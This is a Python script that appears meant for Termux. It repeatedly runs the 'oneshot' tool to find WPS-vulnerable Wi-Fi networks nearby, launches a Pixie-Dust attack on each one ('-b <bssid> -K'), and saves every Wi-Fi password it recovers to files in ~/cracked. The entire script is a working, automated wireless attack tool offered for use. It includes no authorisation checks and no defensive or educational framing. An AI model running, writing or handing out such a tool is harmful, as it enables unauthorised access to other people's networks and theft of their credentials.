#!/usr/bin/env python3
"""
pwnagotchi-like Termux app (text-based) with automatic screen clearing
- Uses `sudo oneshot -i wlan0` to discover networks
- Parses vulnerable BSSIDs and cracks them
- Clears terminal and displays updated stats each cycle
- Shows cycle duration
"""
import os
import sys
import subprocess
import time
import re
from datetime import datetime

INTERFACE = os.environ.get('WIFI_INTERFACE', 'wlan0')
CRACKED_DIR = os.path.expanduser('~/cracked')
SCAN_INTERVAL = 5          # seconds between cycles
SCAN_TIMEOUT = 20          # seconds for scan command
ATTACK_TIMEOUT = 10        # seconds per BSSID attack
ONESHOT_CMD = 'oneshot'
CLEAR_CMD = 'clear'

os.makedirs(CRACKED_DIR, exist_ok=True)

# Run oneshot scan to list networks
def get_vulnerable_bssids():
    try:
        proc = subprocess.run(
            ['sudo', ONESHOT_CMD, '-i', INTERFACE],
            capture_output=True, text=True, timeout=SCAN_TIMEOUT
        )
        output = proc.stdout
    except subprocess.TimeoutExpired:
        return []
    except Exception:
        return []

    bssids = []
    for line in output.splitlines():
        # detect green-colored or marked vulnerable lines
        if '\x1b[32m' in line or '[+]' in line:
            m = re.search(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', line)
            if m:
                bssids.append(m.group(0))
    return list(dict.fromkeys(bssids))  # unique

# Attack a single BSSID
def attack_bssid(bssid):
    try:
        proc = subprocess.run(
            ['sudo', ONESHOT_CMD, '-i', INTERFACE, '-b', bssid, '-K'],
            capture_output=True, text=True, timeout=ATTACK_TIMEOUT
        )
        return proc.stdout + proc.stderr
    except subprocess.TimeoutExpired:
        return ''
    except Exception:
        return ''

# Extract PSKs
def parse_psks(output):
    return re.findall(r'PSK:\s*(\S+)', output)

# Save cracked credentials
def save_crack(bssid, psk):
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    fname = f"{ts}_{bssid.replace(':','')}.txt"
    path = os.path.join(CRACKED_DIR, fname)
    with open(path, 'w') as f:
        f.write(f"BSSID: {bssid}\nPSK: {psk}\n")

# Main loop
def main():
    if os.geteuid() != 0:
        print("[!] Please run as root (tsu)")
        sys.exit(1)

    cycle = 0
    total_scanned = 0
    total_cracked = 0

    while True:
        cycle += 1
        cycle_start = time.time()
        ts = datetime.now().strftime('%H:%M:%S')

        # Discover vulnerable BSSIDs
        bssids = get_vulnerable_bssids()
        scanned_now = len(bssids)
        total_scanned += scanned_now

        cracked_now = 0
        for bssid in bssids:
            out = attack_bssid(bssid)
            psks = parse_psks(out)
            if psks:
                cracked_now += len(psks)
                for psk in psks:
                    save_crack(bssid, psk)
        total_cracked += cracked_now

        # Compute cycle duration
        duration = time.time() - cycle_start

        # Clear screen and print stats
        os.system(CLEAR_CMD)
        print(f"[{ts}] Cycle {cycle} completed in {duration:.1f}s")
        print(f"  Found this cycle: {scanned_now} networks")
        print(f"  Cracked this cycle: {cracked_now} networks")
        print(f"  Totals => Scanned: {total_scanned}, Cracked: {total_cracked}")
        print(f"  Next cycle in {SCAN_INTERVAL}s... (Ctrl+C to quit)")

        time.sleep(SCAN_INTERVAL)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
